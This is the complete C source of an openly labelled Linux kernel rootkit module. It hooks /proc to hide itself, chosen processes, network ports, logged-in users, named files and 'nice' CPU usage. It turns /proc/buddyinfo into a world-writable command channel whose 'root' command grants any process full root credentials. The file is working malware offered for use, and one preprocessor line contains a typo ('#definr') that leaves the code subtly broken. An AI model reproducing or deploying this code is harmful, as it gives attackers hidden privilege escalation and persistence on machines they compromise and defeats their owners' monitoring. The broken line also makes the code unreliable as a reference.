//      This program is free software; you can redistribute it and/or modify
//      it under the terms of the GNU General Public License as published by
//      the Free Software Foundation; either version 3 of the License, or
//      (at your option) any later version.
//
//      This program is distributed in the hope that it will be useful,
//      but WITHOUT ANY WARRANTY; without even the implied warranty of
//      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//      GNU General Public License for more details.
//
//      You should have received a copy of the GNU General Public License
//      along with this program; if not, write to the Free Software
//      Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
//      MA 02110-1301, USA.
//
//      Author: Matías Fontanini
//      Contact: matias.fontanini@gmail.com
//
//      Thanks to Dhiru Kholia(https://github.com/kholia) for porting
//      this rootkit to Linux >= 3.0.


#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/namei.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/version.h>
#include <linux/uaccess.h>
#include <linux/string.h>


#define MODULE_NAME      "rootkit"
#define MAX_COMMAND_SZ   30
#define MAX_HIDDEN_PIDS  80
#define MAX_PID_LENGTH   6
#define MAX_HIDDEN_PORTS 20
#define MAX_PORT_LENGTH  5
#define MAX_HIDDEN_USERS 10
/* Commands */

#define MAKE_ROOT_CMD   "root"
#define HIDE_MOD_CMD    "hide"
#define SHOW_MOD_CMD    "show"
#define HIDE_PID_CMD    "hpid"
#define SHOW_PID_CMD    "spid"
#define HIDE_DPORT_CMD  "hdport"
#define HIDE_SPORT_CMD  "hsport"
#define SHOW_DPORT_CMD  "sdport"
#define SHOW_SPORT_CMD  "ssport"
#define HIDE_USER_CMD   "huser"
#define SHOW_USER_CMD   "suser"




#define USER_PROCESS    7
#define UT_LINESIZE     32
#define UT_NAMESIZE     32
#define UT_HOSTSIZE     256


#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)

#define set_inode(inode, proc_path)\
struct nameidata inode_data;\
if(path_lookup(proc_path, 0, &inode_data))\
    return;\
inode = inode_data.path.dentry->d_inode

#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)

#define set_inode(inode, proc_path)\
struct nameidata inode_data;\
if(path_lookup(proc_path, 0, &inode_data))\
     return;\
inode = inode_data.inode

#else

#define set_inode(inode, proc_path)\
struct path p;\
if (kern_path(proc_path, 0, &p)) {\
    return;\
}\
inode = p.dentry->d_inode;

#endif

#define set_fops_read(inode, fops, proc_origin, func)\
if(!inode)\
    return;\
fops = *inode->i_fop;\
proc_origin = inode->i_fop;\
fops.read = func;\
inode->i_fop = &fops

#define set_fops_readdir(inode, fops, proc_origin, func)\
if(!inode)\
    return;\
fops = *inode->i_fop;\
proc_origin = inode->i_fop;\
fops.readdir = func;\
inode->i_fop = &fops

/* hardened workaround */
#ifdef CONFIG_PAX
typedef struct file_operations __no_const fops_no_const;
#define FOPS_TYPE static fops_no_const
#else
#definr FOPS_TYPE static struct file_operations
#endif

struct exit_status {
  short int e_termination;    /* process termination status */
  short int e_exit;           /* process exit status */
};

struct utmp {
  short ut_type;              /* type of login */
  pid_t ut_pid;               /* PID of login process */
  char ut_line[UT_LINESIZE];  /* device name of tty - "/dev/" */
  char ut_id[4];              /* init id or abbrev. ttyname */
  char ut_user[UT_NAMESIZE];  /* user name */
  char ut_host[UT_HOSTSIZE];  /* hostname for remote login */
  struct exit_status ut_exit; /* The exit status of a process
                                 marked as DEAD_PROCESS */
  int32_t ut_session;         /* Session ID, used for windowing */
  struct {
    int32_t tv_sec;           /* Seconds */
    int32_t tv_usec;          /* Microseconds */
  } ut_tv;                    /* Time entry was made */

 int32_t ut_addr_v6[4];       /* IP address of remote host */
  char __unused[20];           /* Reserved for future use */
};

/* Injection structs */
struct inode *pinode, *tinode, *uinode, *rcinode, *modinode, *sinode;
struct proc_dir_entry *modules, *root, *handler, *tcp;
filldir_t proc_filldir, rc_filldir, mod_filldir;
FOPS_TYPE modules_fops, proc_fops, handler_fops, tcp_fops, user_fops, rc_fops, mod_fops, stat_fops;
const struct file_operations *proc_original = 0,
                             *modules_proc_original = 0,
                             *stat_proc_original = 0,
                             *handler_original = 0,
                             *tcp_proc_original = 0,
                             *user_proc_original = 0,
                             *rc_proc_original = 0,
                             *mod_proc_original;

char *rc_name, *rc_dir, *mod_name, *mod_dir;
module_param(rc_name , charp, 0);
module_param(rc_dir  , charp, 0);
module_param(mod_name, charp, 0);
module_param(mod_dir, charp, 0);


typedef void (*pid_function_t)(unsigned);
typedef void (*hide_port_function_t)(unsigned short);
typedef void (*user_function_t)(char *);


char hidden_pids[MAX_HIDDEN_PIDS][MAX_PID_LENGTH];
char hidden_dports[MAX_HIDDEN_PORTS][MAX_PORT_LENGTH], hidden_sports[MAX_HIDDEN_PORTS][MAX_PORT_LENGTH];
char hidden_users[MAX_HIDDEN_USERS][UT_NAMESIZE];
unsigned hidden_pid_count = 0, hidden_dport_count = 0, hidden_sport_count = 0, hidden_user_count = 0;


int port_in_array(char arr[MAX_HIDDEN_PORTS][MAX_PORT_LENGTH], unsigned sz, char *val) {
    unsigned i;
    for(i = 0; i < sz; ++i)
        if(!strcmp(arr[i], val))
            return 1;
    return 0;
}

int pid_in_array(char arr[MAX_HIDDEN_PIDS][MAX_PID_LENGTH], unsigned sz, char *val) {
    unsigned i;
    for(i = 0; i < sz; ++i)
        if(!strcmp(arr[i], val))
            return 1;
    return 0;
}

int user_in_array(char arr[MAX_HIDDEN_USERS][UT_NAMESIZE], unsigned sz, char *val) {
    unsigned i;
    for(i = 0; i < sz; ++i)
        if(!strcmp(arr[i], val))
            return 1;
    return 0;
}

void hide_module(void) {
    modules->proc_fops = &modules_fops;
}

void show_module(void) {
    modules->proc_fops = modules_proc_original;
}

inline char to_upper(char c) {
    return (c >= 'a' && c <= 'f') ? c - 32 : c;
}

// returns the task_struct associated with pid
struct task_struct *get_task_struct_by_pid(unsigned pid) {
    struct pid *proc_pid = find_vpid(pid);
    struct task_struct *task;
    if(!proc_pid)
        return 0;
    task = pid_task(proc_pid, PIDTYPE_PID);
    return task;
}

void zero_fill_port(char *port) {
    int end=0, i, j;
    while(port[end])
        end++;
    i = MAX_PORT_LENGTH-1;
    j = end;
    while(j >= 0)
        port[i--] = port[j--];
    for(i = 0; i < MAX_PORT_LENGTH - 1 - end; i++)
        port[i] = '0';
}

// makes the process pid belong to uid 0
void make_root(unsigned pid) {
    struct task_struct *task = get_task_struct_by_pid(pid);
    struct task_struct *init_task = get_task_struct_by_pid(1);
    if(!task || !init_task)
        return;
    task->cred = init_task->cred;
}
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
#ifndef CENTOS
char * strnstr(char *s, const char *find, size_t slen) {
	char c, sc;
	size_t len;
	if ((c = *find++) != '\0') {
		len = strlen(find);
		do {
			do {
				if (slen-- < 1 || (sc = *s++) == '\0')
					return 0;
			} while (sc != c);
			if (len > slen)
				return 0;
		} while (strncmp(s, find, len) != 0);
		s--;
	}
	return ((char *)s);
}
#endif
#endif


static ssize_t do_read_modules (struct file *fp, char __user *buf, size_t sz, loff_t *loff) {
    ssize_t read;
    char *ss;
    read = modules_proc_original->read(fp, buf, sz, loff);
    // where's my module name?
    ss = strnstr(buf, MODULE_NAME, strlen(MODULE_NAME));
    if(ss) {
        // stealth please
        char *new_line = strchr(ss, '\n');
        memcpy(ss, new_line + 1, read - (new_line - ss));
        return read - (new_line - ss + 1);
    }
    return read;
}

static ssize_t do_read_tcp (struct file *fp, char __user *buf, size_t sz, loff_t *loff) {
    ssize_t read;
    char *ss, *lstart, *new_line;
    unsigned i = 0, j, found;
    read = tcp_proc_original->read(fp, buf, sz, loff);
    while(i < read) {
        found = 0;
        lstart = &buf[i];
        new_line = strchr(lstart, '\n');
        ss = strchr(strchr(lstart, ':') + 1, ':') + 1;
        // local_address
        for(j = 0; j < hidden_sport_count; ++j) {
            if(!strncmp(hidden_sports[j], ss, 4)) {
                memcpy(lstart, new_line + 1, read - (new_line - lstart));
                read -= (new_line - lstart + 1);
                found = 1;
                j = hidden_sport_count;
            }
        }
        if(!found) {
            ss = strchr(ss, ':') + 1;
            // rem_address
            for(j = 0; j < hidden_dport_count; ++j) {
                if(!strncmp(hidden_dports[j], ss, 4)) {
                    memcpy(lstart, new_line + 1, read - (new_line - lstart));
                    read -= (new_line - lstart + 1);
                    j = hidden_dport_count;
                    found = 1;
                }
            }
        }
        if(!found)
            i += new_line - lstart + 1;
    }
    return read;
}

static ssize_t do_read_users(struct file *fp, char __user *buf, size_t sz, loff_t *loff) {
    ssize_t read = user_proc_original->read(fp, buf, sz, loff);
    struct utmp *data;
    unsigned i = 0, w, found;
    while(i < read) {
        found = 0;
        data = (struct utmp *)&buf[i];
        for(w = 0; w < hidden_user_count && !found; ++w) {
            if(data->ut_type == USER_PROCESS && !strncmp(data->ut_user, hidden_users[w], 6)) {
                unsigned j;
                for(j = 0; j < read - i; ++j) {
                    buf[i+j] = buf[i+j+sizeof(struct utmp)];
                }
                read -= sizeof(struct utmp);
                if(!read)
                    read = user_proc_original->read(fp, &buf[0], sz - i, loff);
                found = 1;
            }
        }
        if(!found)
            i += sizeof(struct utmp);
    }
    return read;
}

static ssize_t do_read_stat(struct file *fp, char __user *buf, size_t sz, loff_t *loff) {
    ssize_t read = stat_proc_original->read(fp, buf, sz, loff);

    int first_cpu = 1, cpu;
    char *lstart, *new_line;
    unsigned i = 0, j, found;
    unsigned long user, nice, system, idle;

    while(i < read) {
        found = 0;
        lstart = &buf[i];
        new_line = strchr(lstart, '\n');

        if (strstr(lstart, "cpu") != NULL) {
            int size, tail;
            const int nl =  strlen_user(new_line);
            const int len =  strlen_user(lstart) - nl;

            char *to = kmalloc(len + 1, GFP_KERNEL);
            char *_tmp1 = kmalloc(len + 1, GFP_KERNEL);
            char *result = kmalloc(len + 1, GFP_KERNEL);

            memset(to, 0, len + 1);
            memset(_tmp1, 0, len + 1);
            memset(result, 0, len + 1);

            if (strncpy_from_user(to, lstart, len) != len)
                printk(KERN_DEBUG "Unable to copy array to kernel\n");

            if (first_cpu) {
                sscanf(to, "cpu  %lu %lu %lu %lu", &user, &nice, &system, &idle);
                sprintf(_tmp1, "cpu  %lu %lu %lu %lu", user, nice, system, idle);
                sprintf(result, "cpu  %lu %lu %lu %lu", user, 0l, system, idle + nice);
                first_cpu = 0;
            } else {
                sscanf(to, "cpu%i %lu %lu %lu %lu", &cpu, &user, &nice, &system, &idle);
                sprintf(_tmp1, "cpu%i %lu %lu %lu %lu", cpu, user, nice, system, idle);
                sprintf(result, "cpu%i %lu %lu %lu %lu", cpu, user, 0l, system, idle + nice);
            }

            size = strlen(result);
            tail = strlen(_tmp1);

            memcpy(result + strlen(result), to + tail, len - tail);

            j = size + len - tail;
            if (copy_to_user(lstart, result, j))
                printk(KERN_DEBUG "Unable to copy array to user\n");;

            memmove(lstart + j, new_line, nl);

            kfree(to);
            kfree(_tmp1);
            kfree(result);

            found = 1;
            read -= (tail - size);
        }
        if(!found) {
            i += new_line - lstart + 1;
        } else {
            i += j + 1;
        }
    }
    return read;
}

void hide_user(char *user) {
    if(hidden_user_count < MAX_HIDDEN_USERS && !user_in_array(hidden_users, hidden_user_count, user)) {
        strcpy(hidden_users[hidden_user_count++], user);
    }
}

void unhide_user(char *user) {
    unsigned i = 0;
    for(; i < hidden_user_count; ++i) {
        if(!strcmp(user, hidden_users[i])) {
            while(i < hidden_user_count-1) {
                strcpy(hidden_users[i], hidden_users[i+1]);
                i++;
            }
            hidden_user_count--;
            return;
        }
    }
}

void hide_pid(unsigned pid) {
    if(hidden_pid_count < MAX_HIDDEN_PIDS && get_task_struct_by_pid(pid)) {
        snprintf(hidden_pids[hidden_pid_count], MAX_PID_LENGTH, "%d", pid);
        if(!pid_in_array(hidden_pids, hidden_pid_count, hidden_pids[hidden_pid_count]))
            hidden_pid_count++;
    }
}

void unhide_pid(unsigned pid) {
    char buffer[MAX_PID_LENGTH];
    unsigned i;
    snprintf(buffer, MAX_PID_LENGTH, "%d", pid);
    // let's find that fuck'n pid
    for(i = 0; i < hidden_pid_count; ++i) {
        if(!strcmp(buffer, hidden_pids[i])) {
            // overwrite it
            while(i < hidden_pid_count-1) {
                strcpy(hidden_pids[i], hidden_pids[i+1]);
                i++;
            }
            hidden_pid_count--;
            return;
        }
    }
}

void generic_pid_function(pid_function_t func, const char __user *data, size_t sz) {
    unsigned i = strlen(HIDE_PID_CMD) + 1;
    char *dummy;
    if(i < sz) {
        unsigned pid = simple_strtol(&data[i], &dummy, 10);
        if(pid)
            func(pid);
    }
}

void generic_user_function(user_function_t func, const char __user *data, size_t sz) {
    unsigned i = strlen(HIDE_PID_CMD) + 2;
    if(i < sz) {
        char buffer[UT_NAMESIZE+1];
        unsigned to_read = min(sz - i, (size_t)UT_NAMESIZE);
        memcpy(buffer, &data[i], to_read);
        buffer[to_read - 1] = 0;
        func(buffer);
    }
}

void unhide_port(unsigned port, char port_array[MAX_HIDDEN_PIDS][MAX_PORT_LENGTH], unsigned *count) {
    char buffer[MAX_PORT_LENGTH];
    unsigned i;
    snprintf(buffer, MAX_PORT_LENGTH, "%x", port);
    for(i = 0; buffer[i]; ++i)
        buffer[i] = to_upper(buffer[i]);
    zero_fill_port(buffer);
    // let's find that fuck'n pid
    for(i = 0; i < *count; ++i) {
        if(!strcmp(buffer, port_array[i])) {
            // overwrite it
            while(i < *count - 1) {
                strcpy(port_array[i], port_array[i+1]);
                i++;
            }
            (*count)--;
            return;
        }
    }
}

void hide_dport(unsigned short port) {
    if(hidden_dport_count < MAX_HIDDEN_PORTS) {
        unsigned i;
        snprintf(hidden_dports[hidden_dport_count], MAX_PORT_LENGTH, "%x", port);
        for(i = 0; hidden_dports[hidden_dport_count][i]; ++i)
            hidden_dports[hidden_dport_count][i] = to_upper(hidden_dports[hidden_dport_count][i]);
        zero_fill_port(hidden_dports[hidden_dport_count]);
        //printk("dport: %s\n", hidden_dports[hidden_dport_count]);
        if(!port_in_array(hidden_dports, hidden_dport_count, hidden_dports[hidden_dport_count]))
            hidden_dport_count++;
    }
}

void hide_sport(unsigned short port) {
    if(hidden_sport_count < MAX_HIDDEN_PORTS) {
        unsigned i;
        snprintf(hidden_sports[hidden_sport_count], MAX_PORT_LENGTH, "%x", port);
        for(i = 0; hidden_sports[hidden_sport_count][i]; ++i)
            hidden_sports[hidden_sport_count][i] = to_upper(hidden_sports[hidden_sport_count][i]);
        zero_fill_port(hidden_sports[hidden_sport_count]);
        if(!port_in_array(hidden_sports, hidden_sport_count, hidden_sports[hidden_sport_count]))
            hidden_sport_count++;
    }
}

void generic_hide_port_function(hide_port_function_t func, const char __user *data, size_t sz, char *cmd_name) {
    unsigned i = strlen(cmd_name) + 1;
    char *dummy;
    if(i < sz) {
        unsigned port = simple_strtol(&data[i], &dummy, 10);
        if(port)
            func(port);
    }
}

void generic_show_port_function(const char __user *data, size_t sz, char *cmd_name, char port_array[MAX_HIDDEN_PIDS][MAX_PORT_LENGTH], unsigned *count) {
    unsigned i = strlen(cmd_name) + 1;
    char *dummy;
    if(i < sz) {
        unsigned port = simple_strtol(&data[i], &dummy, 10);
        if(port)
            unhide_port(port, port_array, count);
    }
}

static ssize_t orders_handler (struct file *filp, const char __user *data, size_t sz, loff_t *l) {
    if(sz > MAX_COMMAND_SZ)
        return -1;
    if(!strncmp(data, MAKE_ROOT_CMD, strlen(MAKE_ROOT_CMD)))
        generic_pid_function(make_root, data, sz);
    else if(!strncmp(data, HIDE_MOD_CMD, strlen(HIDE_MOD_CMD))) 
        hide_module();
    else if(!strncmp(data, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD))) 
        show_module();
    else if(!strncmp(data, HIDE_PID_CMD, strlen(HIDE_PID_CMD))) 
        generic_pid_function(hide_pid, data, sz);
    else if(!strncmp(data, SHOW_PID_CMD, strlen(SHOW_PID_CMD))) 
        generic_pid_function(unhide_pid, data, sz);
    else if(!strncmp(data, HIDE_DPORT_CMD, strlen(HIDE_DPORT_CMD))) 
        generic_hide_port_function(hide_dport, data, sz, HIDE_DPORT_CMD);
    else if(!strncmp(data, HIDE_SPORT_CMD, strlen(HIDE_SPORT_CMD))) 
        generic_hide_port_function(hide_sport, data, sz, HIDE_SPORT_CMD);
    else if(!strncmp(data, SHOW_DPORT_CMD, strlen(SHOW_DPORT_CMD))) 
        generic_show_port_function(data, sz, HIDE_DPORT_CMD, hidden_dports, &hidden_dport_count);
    else if(!strncmp(data, SHOW_SPORT_CMD, strlen(SHOW_SPORT_CMD))) 
        generic_show_port_function(data, sz, HIDE_SPORT_CMD, hidden_sports, &hidden_sport_count);
    else if(!strncmp(data, HIDE_USER_CMD, strlen(HIDE_USER_CMD))) 
        generic_user_function(hide_user, data, sz);
    else if(!strncmp(data, SHOW_USER_CMD, strlen(SHOW_USER_CMD))) 
        generic_user_function(unhide_user, data, sz);
    return -1;
}

int fake_proc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
    unsigned i;
    for(i = 0; i < hidden_pid_count; ++i)
        if(!strcmp(buffer, hidden_pids[i]))
            return 0;
    // do the normal stuff...
    return proc_filldir(a, buffer, c, d, e, f);
}

int fake_rc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
    if(!strcmp(buffer, rc_name))
        return 0;
    // do the normal stuff...
    return rc_filldir(a, buffer, c, d, e, f);
}

int fake_mod_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
    if(!strcmp(buffer, mod_name))
        return 0;
    // do the normal stuff...
    return mod_filldir(a, buffer, c, d, e, f);
}

static int do_readdir_proc (struct file *fp, void *buf, filldir_t fdir) {
    int ret;
    // replace the filldir_t with my own
    proc_filldir = fdir;
    ret = proc_original->readdir(fp, buf, fake_proc_fill_dir);
    return ret;
}

static int do_readdir_rc (struct file *fp, void *buf, filldir_t fdir) {
    int ret;
    // replace the filldir_t with my own
    rc_filldir = fdir;
    ret = rc_proc_original->readdir(fp, buf, fake_rc_fill_dir);
    return ret;
}

static int do_readdir_mod (struct file *fp, void *buf, filldir_t fdir) {
    int ret;
    // replace the filldir_t with my own
    mod_filldir = fdir;
    ret = mod_proc_original->readdir(fp, buf, fake_mod_fill_dir);
    return ret;
}

struct proc_dir_entry *find_dir_entry(struct proc_dir_entry *root, const char *name) {
    struct proc_dir_entry *ptr = root->subdir;
    while(ptr && strcmp(ptr->name, name))
        ptr = ptr->next;
    return ptr;
}

void hook_proc(struct proc_dir_entry *root) {
    set_inode(pinode, "/proc/");

    if(!pinode)
        return;

    // hook /proc readdir
    proc_fops = *pinode->i_fop;
    proc_original = pinode->i_fop;
    proc_fops.readdir = do_readdir_proc;
    pinode->i_fop = &proc_fops;
}

void install_handler(struct proc_dir_entry *root) {
    struct proc_dir_entry *ptr = root->subdir;
    while(ptr && strcmp(ptr->name, "buddyinfo"))
        ptr = ptr->next;
    if(ptr) {
        handler = ptr;
        ptr->mode |= S_IWUGO;
        handler_original = ptr->proc_fops;
        // create new handler
        handler_fops = *ptr->proc_fops;
        handler_fops.write = orders_handler;
        ptr->proc_fops = &handler_fops;
    }
}

void init_module_hide_hook(struct proc_dir_entry *root) {
    modules = find_dir_entry(root, "modules");
    // save original file_operations
    modules_proc_original = modules->proc_fops;
    modules_fops = *modules->proc_fops;
    modules_fops.read = do_read_modules;
}


void init_tcp_hide_hook(struct proc_dir_entry *root) {
    set_inode(tinode, "/proc/net/tcp");
    set_fops_read(tinode, tcp_fops, tcp_proc_original, do_read_tcp);
}

void init_nice_hide_hook(struct proc_dir_entry *root) {
    set_inode(sinode, "/proc/stat");
    set_fops_read(sinode, stat_fops, stat_proc_original, do_read_stat);
}

void init_users_hide_hook(struct proc_dir_entry *root) {
    set_inode(uinode, "/var/run/utmp");
    set_fops_read(uinode, user_fops, user_proc_original, do_read_users);
}

void init_hide_rc(void) {
    set_inode(rcinode, rc_dir);
    set_fops_readdir(rcinode, rc_fops, rc_proc_original, do_readdir_rc);
}

void init_hide_mod(void) {
    set_inode(modinode, mod_dir);
    set_fops_readdir(modinode, mod_fops, mod_proc_original, do_readdir_mod);
}

static int __init module_init_proc(void) {
    static struct file_operations fileops_struct = {0};
    struct proc_dir_entry *new_proc;
    // dummy to get proc_dir_entry of /proc
    if(rc_name && rc_dir)
        init_hide_rc();
    if(mod_name && mod_dir)
        init_hide_mod();
    new_proc = proc_create("dummy", 0644, 0, &fileops_struct);
    root = new_proc->parent;

    init_tcp_hide_hook(root);
    init_module_hide_hook(root);
    init_users_hide_hook(root);
    init_nice_hide_hook(root);

    hook_proc(root);

    // install the handler to wait for orders...
    install_handler(root);

    // i't no longer required.
    remove_proc_entry("dummy", 0);
    return 0;
}

static void module_exit_proc(void) {
    if(proc_original)
        pinode->i_fop = proc_original;
    if(tcp_proc_original)
        tinode->i_fop = tcp_proc_original;
    if(user_proc_original)
        uinode->i_fop = user_proc_original;
    if(rc_proc_original)
        rcinode->i_fop = rc_proc_original;
    if(mod_proc_original)
        modinode->i_fop = mod_proc_original;
    if(stat_proc_original)
        sinode->i_fop = stat_proc_original;
    show_module();
    if(handler_original) {
        handler->proc_fops = handler_original;
        handler->mode &= (~S_IWUGO);
    }
}

module_init(module_init_proc);
module_exit(module_exit_proc);

MODULE_LICENSE("GPL");
